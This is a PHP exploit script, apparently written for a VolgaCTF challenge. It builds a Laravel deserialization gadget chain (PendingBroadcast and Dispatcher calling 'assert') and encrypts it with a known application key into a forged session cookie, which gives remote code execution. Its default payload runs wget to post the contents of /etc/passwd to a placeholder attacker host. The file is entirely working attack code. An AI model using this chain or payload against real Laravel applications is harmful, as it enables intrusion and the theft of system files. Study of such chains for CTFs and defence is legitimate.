<?php
    /* Unserialize Chain */
    /* See also https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laravel/RCE/1 */

        namespace Illuminate\Broadcasting {
            class PendingBroadcast {
                protected $events;
                protected $event;

                function __construct($events, $cmd) {
                    $this->events = $events;
                    $this->event = $cmd;
                }
            }
        }


        namespace Illuminate\Events {
            class Dispatcher {
                protected $listeners;

                function __construct($cmd) {
                    $this->listeners = [
                        $cmd => ['assert']
                    ];
                }
            }
        }

        namespace {

            function generateChain($code) {
                return serialize(new \Illuminate\Broadcasting\PendingBroadcast(new \Illuminate\Events\Dispatcher($code), $code));
            }

    /* // Unserialize Chain */

    /* Laravel Encryptor */

            function encrypt($value, $serialize = false) {
                global $cipher, $key;
                $iv = random_bytes(openssl_cipher_iv_length($cipher));
                $value = openssl_encrypt(
                    $serialize ? serialize($value) : $value,
                    $cipher, $key, 0, $iv
                );
                $iv = base64_encode($iv);
                $mac = hash_hmac('sha256', $iv.$value, $key);
                $json = json_encode(compact('iv', 'value', 'mac'));
                return base64_encode($json);
            }

            function decrypt($payload, $unserialize = false) {
                global $cipher, $key;
                $payload = json_decode(base64_decode($payload), true);
                $iv = base64_decode($payload['iv']);
                $decrypted = openssl_decrypt(
                    $payload['value'], $cipher, $key, 0, $iv
                );
                return $unserialize ? unserialize($decrypted) : $decrypted;
            }

    /* // Laravel Encryptor */

            $cipher = 'AES-256-CBC';
            $key = isset($argv[1]) ? $argv[1] : 'ABCDEF1234567890ABCDEF1234567890';
            $cmd = isset($argv[2]) ? $argv[2] : "system('wget --post-data \"`cat /etc/passwd`\" https://attacker_site/');";
            
            if (substr($key, 0, 7) == 'base64:') {
                $key = base64_decode(substr($key, 7));
            }
            
            echo 'Cookie: volgactf_task_session='.encrypt(generateChain($cmd));
        }